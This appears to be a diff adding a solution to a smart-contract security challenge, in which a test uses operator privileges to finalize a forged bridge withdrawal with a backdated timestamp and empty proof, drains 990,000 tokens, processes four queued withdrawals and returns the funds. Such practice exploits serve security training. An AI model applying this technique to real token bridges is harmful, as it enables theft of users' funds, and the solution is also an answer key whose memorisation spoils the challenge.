@@ -89,7 +89,69 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+
+        // Borrow almost all tokens from the bridge to have enough for the withdrawals
+        bytes memory message = abi.encodeCall(
+            L1Forwarder.forwardMessage,
+            (
+                0, // nonce
+                address(0), // l2Sender  
+                address(l1TokenBridge), // target
+                abi.encodeCall( // encode the actual withdrawal call
+                    TokenBridge.executeTokenWithdrawal,
+                    (
+                        player, // recipient of the withdrawal
+                        990_000e18 // amount to withdraw - leaving 100k in bridge
+                    )
+                )
+            )
+        );
+
+        // Finalize a suspicious withdrawal with an old timestamp using operator privileges
+        l1Gateway.finalizeWithdrawal(
+            0, // nonce
+            l2Handler, // l2Sender  
+            address(l1Forwarder), // target 
+            block.timestamp - 7 days, // old timestamp to pass the 7-day delay requirement
+            message, 
+            new bytes32[](0) // empty proof array since we're using operator privilege  
+        );
+
+        // Fast forward time by 8 days to surpass the 7-day delay for the other withdrawals
+        skip(8 days);
+
+        address sender = 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16;
+        address target = 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5;
+
+        // Data for the 4 withdrawals to be finalized
+        uint256[] memory timestamps = new uint256[](4);
+        timestamps[0] = 1718786915;
+        timestamps[1] = 1718786965;
+        timestamps[2] = 1718787050;
+        timestamps[3] = 1718787127;
+
+        // Encoded data for the 4 withdrawals
+        bytes[] memory data = new bytes[](4);
+        data[0] = hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";  
+        data[1] = hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+        data[2] = hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000";
+        data[3] = hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+
+        for (uint i = 0; i < data.length; i++) {
+            l1Gateway.finalizeWithdrawal(
+            i, // nonce
+            sender, // l2Sender
+            target, // target
+            timestamps[i], // timestamp
+            data[i], // encoded message data
+            new bytes32[](0) // no proof needed as operator
+        );
+        }
+
+        // Return the borrowed tokens to the bridge
+        token.transfer(address(l1TokenBridge),990_000e18);
+       
+
     }
 
     /**
